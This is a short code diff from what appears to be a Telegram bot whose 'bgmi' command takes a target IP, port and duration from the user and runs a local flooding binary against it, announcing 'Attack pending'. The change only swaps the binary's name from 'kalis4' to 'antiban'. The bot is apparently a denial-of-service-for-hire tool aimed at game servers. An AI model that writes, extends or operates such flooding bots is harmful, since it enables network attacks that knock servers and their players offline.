@@ -114,7 +114,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./kalis4', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./antiban', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'𝗔𝘁𝘁𝗮𝗰𝗸 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 🦸\n\n—͟͞͞★ᴛᴀʀɢᴇᴛ :- {target_ip}\nᖘ٥ŕԵ :- {port} \nꕶË₸ﾟ:- {duration}𝗌℮cõ𝑛𝚍\n𝗧𝗔𝗣 𝗧𝗢 𝗦𝗧𝗔𝗥𝗧 :- /start\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩')
 
 
